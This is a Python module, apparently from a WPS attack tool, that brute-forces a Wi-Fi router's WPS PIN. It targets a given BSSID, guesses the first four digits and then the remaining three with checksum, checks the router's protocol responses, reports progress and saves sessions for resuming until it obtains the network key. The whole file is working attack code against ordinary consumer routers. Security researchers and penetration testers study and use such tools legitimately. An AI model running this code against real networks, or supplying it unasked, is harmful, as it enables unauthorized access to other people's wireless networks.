import collections
import statistics
import time

from datetime import datetime

import src.wps.generator
import src.wps.connection
import src.utils
import src.args

class BruteforceStatus:
    """Stores bruteforce details and status"""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time()   # Last PIN attempt start time
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        # pylint: disable=consider-using-f-string
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.display_status()

    def clear(self):
        self.__init__()

class Initialize:
    """Handles bruteforce"""

    def __init__(self, interface: str):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
        self.GENERATOR  = src.wps.generator.WPSpin()
        self.CONNECTION = src.wps.connection.Initialize(
            interface
        )

    def __firstHalfBruteforce(self, bssid: str, f_half: str, delay: float = None):
        """
        @f_half — 4-character string
        """

        checksum = self.GENERATOR.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.CONNECTION.singleConnection(bssid, pin)
            if self.CONNECTION_STATUS.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__firstHalfBruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(f_half)
            if delay:
                time.sleep(delay)

        print('[-] First half not found')
        return False

    def __secondHalfBruteforce(self, bssid: str, f_half: str, s_half: str, delay: float = None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """

        checksum = self.GENERATOR.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.CONNECTION.singleConnection(bssid, pin)
            if self.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin
            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__secondHalfBruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False


    def smartBruteforce(self, bssid: str, start_pin: str = None, delay: float = None):
        sessions_dir = src.utils.SESSIONS_DIR
        args = src.args.parseArgs()

        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = sessions_dir + f'{bssid.replace(":", "").upper()}.run'
                with open(filename, 'r', encoding='utf-8') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.BRUTEFORCE_STATUS.MASK = mask
            if len(mask) == 4:
                f_half = self.__firstHalfBruteforce(bssid, mask, delay)
                if f_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self.__secondHalfBruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__secondHalfBruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt as e:
            print('\nAborting…')
            filename = sessions_dir + f'{bssid.replace(":", "").upper()}.run'

            with open(filename, 'w', encoding='utf-8') as file:
                file.write(self.BRUTEFORCE_STATUS.MASK)
            print(f'[i] Session saved in {filename}')

            if args.loop:
                raise KeyboardInterrupt from e
